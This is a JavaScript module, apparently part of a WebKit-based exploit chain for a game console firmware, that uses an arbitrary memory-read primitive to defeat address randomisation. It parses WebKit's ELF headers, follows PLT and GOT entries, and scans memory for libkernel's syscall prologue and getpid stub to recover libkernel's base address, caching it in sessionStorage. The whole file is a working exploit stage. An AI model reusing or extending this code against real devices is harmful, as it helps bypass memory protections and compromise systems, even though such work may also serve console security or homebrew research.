/**
 * libkernel on 13.52 — PLT xrefs in mapped .text, RELRO GOT, prologue/stub hunts.
 * Never reads high unmapped IAT (+0x3cb8cc8). Max ~4 reads per GOT slot.
 */
import { int64 } from "./int64.js";
import { webkitRvaMax } from "./pivot_gadgets.js";

const ELF_MAGIC = 0x464c457f;
const PT_LOAD = 1;
const PF_R = 4;
const PF_W = 2;
const PF_X = 1;

const SS_LK_BASE = "wk-libkernelBase";
const SS_IAT_RVA = "wk-imp-error-rva";

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function read2p(p, addr) {
    if (!addr) return null;
    try { return p.read2(addr); } catch (_) { return null; }
}

function read1p(p, addr) {
    if (!addr) return null;
    try { return p.read1(addr); } catch (_) { return null; }
}

function parseAddrSync(raw) {
    if (!raw) return null;
    const s = String(raw).replace(/^0x/i, "").trim();
    if (!s) return null;
    const n = BigInt("0x" + s);
    return new int64(Number(n & 0xffffffffn), Number((n >> 32n) & 0xffffffffn));
}

function u64FromRead8(w) {
    if (!w) return null;
    return (BigInt(w.hi >>> 0) << 32n) | BigInt(w.low >>> 0);
}

function iatCap(off) {
    return webkitRvaMax(off);
}

function rvaAllowed(rva, off) {
    return rva >= 0x10000 && rva <= iatCap(off);
}

export function isSyscallStub(v, num) {
    if (!v) return false;
    if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) return false;
    const n = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
    return n === num;
}

export function isGetpidStub(v) {
    return isSyscallStub(v, 20);
}

const GETPID_STUB_CANDS = [
    0x2cb70, 0x2d5e0, 0x2cb80, 0x2cc00, 0x28000, 0x29000, 0x2a000, 0x2b000,
    0x30000, 0x31000, 0x32000, 0x25000, 0x26000,
];

function getpidStubOffsets(off) {
    const out = [];
    if (off.k_stubs && off.k_stubs[20] != null) out.push(off.k_stubs[20]);
    for (let i = 0; i < GETPID_STUB_CANDS.length; i++) {
        const v = GETPID_STUB_CANDS[i];
        if (out.indexOf(v) < 0) out.push(v);
    }
    return out;
}

function lkFromStubAddr(p, stubAddr, off) {
    const offs = getpidStubOffsets(off);
    for (let i = 0; i < offs.length; i++) {
        const lk = stubAddr.sub32(offs[i]);
        if (lkAligned(lk) && isLibkernelPrologue(p, lk))
            return { lk, stubOff: offs[i] };
    }
    let page = new int64((stubAddr.low >>> 0) & ~0x3fff, stubAddr.hi >>> 0);
    for (let back = 0; back <= 0x40000; back += 0x4000) {
        const lk = page.sub32(back);
        if (lkAligned(lk) && isLibkernelPrologue(p, lk))
            return { lk, stubOff: Number(ptrBig(stubAddr) - ptrBig(lk)) };
    }
    return null;
}

/** Cheap prologue check — two reads (mov eax, imm; syscall). */
export function isLibkernelPrologue(p, lk) {
    if (!lk || lk.hi < 0x8) return false;
    const w0 = read4p(p, lk);
    const w1 = read4p(p, lk.add32(4));
    if (w0 == null || w1 == null) return false;
    return (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f;
}

export function saveLibkernelSession(lk, iatRva) {
    try {
        if (lk) sessionStorage.setItem(SS_LK_BASE, String(lk));
        if (iatRva != null) sessionStorage.setItem(SS_IAT_RVA, iatRva.toString(16));
    } catch (_) { }
}

function loadSessionIatRva() {
    try {
        const n = parseInt(sessionStorage.getItem(SS_IAT_RVA), 16);
        return n > 0 ? n : null;
    } catch (_) {
        return null;
    }
}

/** True if ptr looks like an address inside the mapped webkit image. */
function ptrInWebkitImage(fnPtr, webkitBase, off) {
    if (!fnPtr || !webkitBase) return false;
    if (fnPtr.hi !== webkitBase.hi) return false;
    const cap = iatCap(off);
    const lo = webkitBase.low >>> 0;
    const fl = fnPtr.low >>> 0;
    if (fl < lo) return false;
    return (fl - lo) <= cap;
}

/** External userland code pointer — not null, not webkit interior. */
function plausibleExtPtr(fnPtr, webkitBase, off) {
    if (!fnPtr) return false;
    if (fnPtr.hi < 0x8) return false;
    if (fnPtr.hi === 0 && fnPtr.low < 0x100000) return false;
    if (ptrInWebkitImage(fnPtr, webkitBase, off)) return false;
    return true;
}

function bigToPtr(b) {
    return new int64(Number(b & 0xffffffffn), Number((b >> 32n) & 0xffffffffn));
}

function ptrBig(w) {
    return (BigInt(w.hi >>> 0) << 32n) | BigInt(w.low >>> 0);
}

const K_ERROR_CANDS = [0x26420, 0x26430, 0x25000, 0x30000, 0xd9d0];

function kErrorCandidates(off) {
    const out = [];
    if (off.k__error != null) out.push(off.k__error);
    for (let i = 0; i < K_ERROR_CANDS.length; i++) {
        const v = K_ERROR_CANDS[i];
        if (out.indexOf(v) < 0) out.push(v);
    }
    return out;
}

function s32(v) {
    if (v == null) return null;
    return v | 0;
}

/** Follow one webkit PLT jmp [rip+disp] hop (ff 25). */
function resolveImportPtr(p, webkitBase, off, fnPtr, depth) {
    if (!fnPtr || depth > 1) return fnPtr;
    if (plausibleExtPtr(fnPtr, webkitBase, off)) return fnPtr;
    if (!ptrInWebkitImage(fnPtr, webkitBase, off)) return null;
    const b0 = read1p(p, fnPtr);
    const b1 = read1p(p, fnPtr.add32(1));
    if (b0 !== 0xff || b1 !== 0x25) return null;
    const disp = s32(read4p(p, fnPtr.add32(2)));
    if (disp == null) return null;
    const slot = fnPtr.add32(6 + disp);
    const tgt = read8p(p, slot);
    if (!tgt) return null;
    return resolveImportPtr(p, webkitBase, off, tgt, depth + 1);
}

function lkFromFnPtr(p, fnPtr, off, iatRva) {
    if (isGetpidStub(fnPtr)) {
        const hit = lkFromStubAddr(p, fnPtr, off);
        if (hit)
            return { lk: hit.lk, iatRva, errorFn: fnPtr, via: "getpid+" + hit.stubOff.toString(16) };
    }

    const entryB0 = read1p(p, fnPtr);
    if (entryB0 !== 0xb8) return null;

    const errs = kErrorCandidates(off);
    for (let i = 0; i < errs.length; i++) {
        const lk = fnPtr.sub32(errs[i]);
        if (lkAligned(lk) && isLibkernelPrologue(p, lk))
            return { lk, iatRva, errorFn: fnPtr, via: "error+" + errs[i].toString(16) };
    }

    const pageBase = new int64((fnPtr.low >>> 0) & ~0x3fff, fnPtr.hi >>> 0);
    if (lkAligned(pageBase) && isLibkernelPrologue(p, pageBase))
        return { lk: pageBase, iatRva, errorFn: fnPtr, via: "page" };

    return null;
}

function lkAligned(lk) {
    return lk && lk.hi >= 0x8 && (lk.low & 0x3fff) === 0;
}

/** Verify GOT slot — read8 + optional PLT hop + ≤4 follow-up reads. */
function safeVerifyGotSlot(p, webkitBase, off, rva) {
    if (!rvaAllowed(rva, off)) return null;
    let fnPtr = read8p(p, webkitBase.add32(rva));
    if (!fnPtr) return null;
    fnPtr = resolveImportPtr(p, webkitBase, off, fnPtr, 0);
    if (!fnPtr || !plausibleExtPtr(fnPtr, webkitBase, off)) return null;
    return lkFromFnPtr(p, fnPtr, off, rva);
}

function scanAnchorsInit(sub, anchors, radius, step) {
    sub = {
        anchorIdx: 0,
        anchors: anchors.map(a => ptrBig(a)),
        cursor: 0n,
        end: 0n,
        step: step,
        probes: 0,
    };
    const center = sub.anchors[0];
    sub.cursor = center > radius ? center - radius : 0n;
    sub.end = center + radius;
    return sub;
}

function scanAnchorsAdvance(sub, radius) {
    const next = sub.anchorIdx + 1;
    if (next >= sub.anchors.length) return false;
    sub.anchorIdx = next;
    const center = sub.anchors[next];
    sub.cursor = center > radius ? center - radius : 0n;
    sub.end = center + radius;
    return true;
}

/** Scan mapped .text for FF 15/FF 25 → GOT slots within cap. */
function scanPltGotChunk(p, webkitBase, off, state) {
    if (!state) {
        const textRanges = elfMappedTextRanges(p, webkitBase, off);
        if (!textRanges.length)
            return { done: true, lk: null, state: null, phase: "no-text" };
        state = {
            textRanges,
            rangeIdx: 0,
            cursor: textRanges[0].lo,
            endRva: textRanges[0].hi,
            seen: {},
            refs: 0,
        };
        return {
            done: false,
            state,
            phase: "plt-start",
            spans: textRanges.length,
        };
    }

    let batchBytes = 0;
    while (state.cursor < state.endRva && batchBytes < 2048) {
        const rva = state.cursor;
        const w0 = read4p(p, webkitBase.add32(rva));
        const w1 = read4p(p, webkitBase.add32(rva + 4));
        if (w0 != null && w1 != null) {
            const bytes = [
                w0 & 0xff, (w0 >>> 8) & 0xff, (w0 >>> 16) & 0xff, (w0 >>> 24) & 0xff,
                w1 & 0xff, (w1 >>> 8) & 0xff, (w1 >>> 16) & 0xff, (w1 >>> 24) & 0xff,
            ];
            for (let i = 0; i < 7; i++) {
                if (bytes[i] !== 0xff) continue;
                if (bytes[i + 1] !== 0x15 && bytes[i + 1] !== 0x25) continue;
                const insnRva = rva + i;
                const raw = read4p(p, webkitBase.add32(insnRva + 2));
                const disp = s32(raw);
                if (disp == null) continue;
                const gotRva = insnRva + 6 + disp;
                if (gotRva < 0x10000 || gotRva > iatCap(off)) continue;
                const key = gotRva.toString(16);
                if (state.seen[key]) continue;
                state.seen[key] = 1;
                state.refs++;
                const hit = safeVerifyGotSlot(p, webkitBase, off, gotRva);
                if (hit) {
                    saveLibkernelSession(hit.lk, hit.iatRva);
                    return {
                        done: true,
                        lk: hit.lk,
                        iatRva: hit.iatRva,
                        source: "plt/" + hit.via,
                        state,
                        phase: "plt-hit",
                        refs: state.refs,
                    };
                }
            }
        }
        state.cursor += 4;
        batchBytes += 4;
    }

    if (state.cursor >= state.endRva) {
        const next = state.rangeIdx + 1;
        if (next < state.textRanges.length) {
            state.rangeIdx = next;
            state.cursor = state.textRanges[next].lo;
            state.endRva = state.textRanges[next].hi;
            return {
                done: false,
                state,
                phase: "plt-region",
                region: state.textRanges[next].tag,
                cursor: state.cursor,
            };
        }
        return { done: true, lk: null, state, phase: "plt-miss", refs: state.refs };
    }

    return {
        done: false,
        state,
        phase: "plt",
        cursor: state.cursor,
        refs: state.refs,
    };
}

/** Direct libkernel base hunt — page-aligned mov eax;syscall prologue. */
function scanLkPrologueChunk(p, off, sub, anchors) {
    const RADIUS = 0x10000000n;
    const STEP = 0x4000n;

    if (!anchors || !anchors.length)
        return { done: true, lk: null, state: sub, phase: "base-skip" };

    if (!sub) {
        sub = scanAnchorsInit({}, anchors, RADIUS, STEP);
        return {
            done: false,
            state: sub,
            phase: "base-start",
            anchor: 0,
            from: sub.cursor.toString(16),
            to: sub.end.toString(16),
        };
    }

    let batch = 0;
    while (sub.cursor <= sub.end && batch < 32) {
        const addr = bigToPtr(sub.cursor);
        if (addr.hi >= 0x8 && lkAligned(addr)) {
            sub.probes++;
            if (isLibkernelPrologue(p, addr)) {
                saveLibkernelSession(addr, null);
                return {
                    done: true,
                    lk: addr,
                    iatRva: null,
                    source: "prologue",
                    state: sub,
                    phase: "base-hit",
                };
            }
        }
        sub.cursor += sub.step;
        batch++;
    }

    if (sub.cursor > sub.end) {
        if (scanAnchorsAdvance(sub, RADIUS)) {
            return {
                done: false,
                state: sub,
                phase: "base-anchor",
                anchor: sub.anchorIdx,
                from: sub.cursor.toString(16),
                to: sub.end.toString(16),
            };
        }
        return { done: true, lk: null, state: sub, phase: "base-miss", probes: sub.probes };
    }

    return {
        done: false,
        state: sub,
        phase: "base",
        at: sub.cursor.toString(16),
        probes: sub.probes,
        anchor: sub.anchorIdx,
    };
}

function isMovRaxImmStart(p, addr) {
    const w = read4p(p, addr);
    return w != null && (w & 0xffffff) === 0xc0c748;
}

/** Sparse getpid stub hunter ±128MB from anchor(s), 4KB steps. */
function scanLibkernelStubChunk(p, webkitBase, off, sub, anchors) {
    if (!anchors || !anchors.length) {
        return { done: true, lk: null, state: sub, phase: "stub-skip" };
    }

    const RADIUS = 0x8000000n;
    const STEP = 0x1000n;

    if (!sub) {
        sub = scanAnchorsInit({}, anchors, RADIUS, STEP);
        return {
            done: false,
            state: sub,
            phase: "stub-start",
            anchor: 0,
            from: sub.cursor.toString(16),
            to: sub.end.toString(16),
        };
    }

    let batch = 0;
    while (sub.cursor <= sub.end && batch < 16) {
        const addr = bigToPtr(sub.cursor);
        if (addr.hi >= 0x8) {
            sub.probes++;
            if (isMovRaxImmStart(p, addr)) {
                const v = read8p(p, addr);
                if (isGetpidStub(v) || isSyscallStub(v, 20)) {
                    const hit = lkFromStubAddr(p, addr, off);
                    if (hit) {
                        saveLibkernelSession(hit.lk, null);
                        return {
                            done: true,
                            lk: hit.lk,
                            iatRva: null,
                            source: "stub-near",
                            stubAt: String(addr),
                            stubOff: hit.stubOff,
                            state: sub,
                            phase: "stub-hit",
                        };
                    }
                }
            }
        }
        sub.cursor += sub.step;
        batch++;
    }

    if (sub.cursor > sub.end) {
        if (scanAnchorsAdvance(sub, RADIUS)) {
            return {
                done: false,
                state: sub,
                phase: "stub-anchor",
                anchor: sub.anchorIdx,
                from: sub.cursor.toString(16),
                to: sub.end.toString(16),
            };
        }
        return { done: true, lk: null, state: sub, phase: "stub-miss", probes: sub.probes };
    }

    return {
        done: false,
        state: sub,
        phase: "stub",
        at: sub.cursor.toString(16),
        probes: sub.probes,
        anchor: sub.anchorIdx,
    };
}

/** PT_LOAD readable non-exec within cap — RELRO .got + writable data. */
export function elfMappedGotRanges(p, webkitBase, off) {
    const cap = iatCap(off);
    if (read4p(p, webkitBase) !== ELF_MAGIC) return [];
    if (read2p(p, webkitBase.add32(0x12)) !== 0x3e) return [];

    const ePhoff = read4p(p, webkitBase.add32(0x20));
    const ePhnum = read2p(p, webkitBase.add32(0x38));
    const ePhentsize = read2p(p, webkitBase.add32(0x36));
    if (ePhoff == null || !ePhnum || !ePhentsize) return [];

    const ranges = [];
    for (let i = 0; i < ePhnum; i++) {
        const ph = ePhoff + i * ePhentsize;
        const pType = read4p(p, webkitBase.add32(ph));
        if (pType !== PT_LOAD) continue;
        const pFlags = read4p(p, webkitBase.add32(ph + 4));
        if ((pFlags & PF_R) === 0) continue;
        if ((pFlags & PF_X) !== 0) continue;

        const wVaddr = read8p(p, webkitBase.add32(ph + 0x10));
        const wMemsz = read8p(p, webkitBase.add32(ph + 0x28));
        if (!wVaddr || !wMemsz) continue;

        const lo = Number(u64FromRead8(wVaddr) & 0xffffffffn);
        let hi = lo + Number(u64FromRead8(wMemsz) & 0xffffffffn);
        if (lo >= cap) continue;
        if (hi > cap) hi = cap;
        if (lo + 0x1000 >= hi) continue;
        const tag = (pFlags & PF_W) ? "rw" : "ro";
        ranges.push({ lo: lo & ~7, hi, tag: tag + i });
    }
    ranges.sort((a, b) => a.lo - b.lo);
    return ranges;
}

/** @deprecated alias */
export function elfMappedRwRanges(p, webkitBase, off) {
    return elfMappedGotRanges(p, webkitBase, off);
}

/** PT_LOAD executable segments within mapped cap. */
export function elfMappedTextRanges(p, webkitBase, off) {
    const cap = iatCap(off);
    if (read4p(p, webkitBase) !== ELF_MAGIC) return [];
    if (read2p(p, webkitBase.add32(0x12)) !== 0x3e) return [];

    const ePhoff = read4p(p, webkitBase.add32(0x20));
    const ePhnum = read2p(p, webkitBase.add32(0x38));
    const ePhentsize = read2p(p, webkitBase.add32(0x36));
    if (ePhoff == null || !ePhnum || !ePhentsize) return [];

    const ranges = [];
    for (let i = 0; i < ePhnum; i++) {
        const ph = ePhoff + i * ePhentsize;
        const pType = read4p(p, webkitBase.add32(ph));
        if (pType !== PT_LOAD) continue;
        const pFlags = read4p(p, webkitBase.add32(ph + 4));
        if ((pFlags & PF_X) === 0) continue;

        const wVaddr = read8p(p, webkitBase.add32(ph + 0x10));
        const wMemsz = read8p(p, webkitBase.add32(ph + 0x28));
        if (!wVaddr || !wMemsz) continue;

        const lo = Number(u64FromRead8(wVaddr) & 0xffffffffn);
        let hi = lo + Number(u64FromRead8(wMemsz) & 0xffffffffn);
        if (lo >= cap) continue;
        if (hi > cap) hi = cap;
        if (lo + 0x1000 >= hi) continue;
        ranges.push({ lo: lo & ~3, hi, tag: "tx" + i });
    }
    ranges.sort((a, b) => a.lo - b.lo);
    return ranges;
}

function rvaInRwRanges(rva, ranges) {
    for (let i = 0; i < ranges.length; i++) {
        if (rva >= ranges[i].lo && rva < ranges[i].hi) return true;
    }
    return false;
}

function iatHitReturn(state, hit, source) {
    saveLibkernelSession(hit.lk, hit.iatRva);
    state.done = true;
    return {
        done: true,
        lk: hit.lk,
        iatRva: hit.iatRva,
        source: source + (hit.via ? "/" + hit.via : ""),
        state,
    };
}

function beginGotScan(state, ranges) {
    state.phase = "got";
    state.gotRanges = ranges;
    state.rangeIdx = 0;
    state.cursor = ranges[0].lo;
    state.endRva = ranges[0].hi;
    state.slots = 0;
}

/**
 * Chunked GOT scan — ELF readable non-exec segments (RELRO + writable).
 */
export function scanErrorIatChunk(p, webkitBase, off, state) {
    if (!state) {
        state = { phase: "ranges", done: false };
    }

    if (state.phase === "ranges") {
        const ranges = elfMappedGotRanges(p, webkitBase, off);
        if (!ranges.length) {
            state.done = true;
            return { done: true, lk: null, state, phase: "no-got" };
        }
        beginGotScan(state, ranges);
        return {
            done: false,
            state,
            phase: "got-start",
            ranges: ranges.map(r => "+0x" + r.lo.toString(16)
                + "…+0x" + r.hi.toString(16) + "(" + r.tag + ")").join(" "),
        };
    }

    if (state.phase === "got" || state.phase === "rw") {
        const ranges = state.gotRanges || state.rwRanges;
        let steps = 0;
        while (state.cursor < state.endRva && steps < 24) {
            if (rvaInRwRanges(state.cursor, ranges)) {
                state.slots++;
                const hit = safeVerifyGotSlot(p, webkitBase, off, state.cursor);
                if (hit)
                    return iatHitReturn(state, hit, "got");
            }
            state.cursor += 8;
            steps++;
        }

        if (state.cursor >= state.endRva) {
            const next = (state.rangeIdx || 0) + 1;
            if (next < ranges.length) {
                state.rangeIdx = next;
                state.cursor = ranges[next].lo;
                state.endRva = ranges[next].hi;
                return {
                    done: false,
                    state,
                    phase: "got-region",
                    region: ranges[next].tag,
                    cursor: state.cursor,
                    end: state.endRva,
                };
            }
            state.done = true;
            return { done: true, lk: null, state, phase: "got-miss", slots: state.slots };
        }

        return {
            done: false,
            state,
            phase: "got",
            cursor: state.cursor,
            end: state.endRva,
            slots: state.slots,
            region: ranges[state.rangeIdx].tag,
        };
    }

    state.done = true;
    return { done: true, lk: null, state };
}

/**
 * PLT→GOT, RELRO brute, prologue page scan, getpid stub hunt.
 */
export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
    opts = opts || {};
    if (!state) {
        state = {
            stage: "plt",
            sub: null,
            gotSlots: 0,
            pltRefs: 0,
            done: false,
            anchors: null,
        };
    }

    if (!state.anchors) {
        state.anchors = [webkitBase];
        if (opts.nativeFn) {
            const nb = ptrBig(opts.nativeFn);
            const wb = ptrBig(webkitBase);
            if (nb !== wb) state.anchors.push(opts.nativeFn);
        }
    }

    if (state.stage === "plt") {
        const c = scanPltGotChunk(p, webkitBase, off, state.sub);
        state.sub = c.state;
        if (c.refs != null) state.pltRefs = c.refs;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "got";
            state.sub = null;
            return {
                done: false,
                state,
                phase: "got-next",
                prev: c.phase,
                refs: state.pltRefs,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "got" || state.stage === "rw") {
        const c = scanErrorIatChunk(p, webkitBase, off, state.sub);
        state.sub = c.state;
        if (c.slots != null) state.gotSlots = c.slots;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "base";
            state.sub = null;
            return {
                done: false,
                state,
                phase: "base-next",
                prev: c.phase,
                slots: state.gotSlots,
                refs: state.pltRefs,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "base") {
        const c = scanLkPrologueChunk(p, off, state.sub, state.anchors);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "stub";
            state.sub = null;
            return {
                done: false,
                state,
                phase: "stub-next",
                prev: c.phase,
                probes: c.probes,
                slots: state.gotSlots,
                refs: state.pltRefs,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "stub") {
        const c = scanLibkernelStubChunk(p, webkitBase, off, state.sub, state.anchors);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.done = true;
            return {
                done: true,
                lk: null,
                state,
                phase: c.phase,
                probes: c.probes,
                slots: state.gotSlots,
                refs: state.pltRefs,
            };
        }
        return Object.assign({ state }, c);
    }

    return { done: true, lk: null, state };
}

export function resolveLibkernel(p, webkitBase, off, opts) {
    opts = opts || {};
    const log = opts.log || (() => {});

    if (!off)
        return { ok: false, error: "missing offsets" };

    try {
        const rawLk = sessionStorage.getItem(SS_LK_BASE);
        if (rawLk) {
            const lk = parseAddrSync(rawLk);
            if (lk && isLibkernelPrologue(p, lk)) {
                log("LK-CACHE", "libkernel " + lk);
                return { ok: true, lk, source: "cache" };
            }
            log("LK-CACHE-BAD", "stale " + rawLk + " — cleared");
            sessionStorage.removeItem(SS_LK_BASE);
        }
    } catch (_) { }

    const savedIat = loadSessionIatRva();
    if (savedIat != null && rvaAllowed(savedIat, off)) {
        const hit = safeVerifyGotSlot(p, webkitBase, off, savedIat);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            log("LK-IAT", "+0x" + hit.iatRva.toString(16) + " → " + hit.lk);
            return { ok: true, lk: hit.lk, iatRva: hit.iatRva, source: "session" };
        }
    }

    log("LK-BLOCK", "13.00 IAT +0x3cb8cc8 unmapped — Scan libkernel or paste base");
    return { ok: false, error: "tap Scan libkernel or paste libkernel base" };
}

/** Validate user-pasted libkernel base (1 read). */
export function verifyManualLibkernel(p, lk) {
    if (!lk || !isLibkernelPrologue(p, lk))
        return { ok: false, error: "not libkernel prologue (want 0xb8 @ base)" };
    saveLibkernelSession(lk, null);
    return { ok: true, lk };
}

export function elfGotPltRva() {
    return null;
}

export function scanGotPltSlots() {
    return null;
}

export function resolveLibkernelFast() {
    return { ok: false, error: "use RW GOT scan" };
}
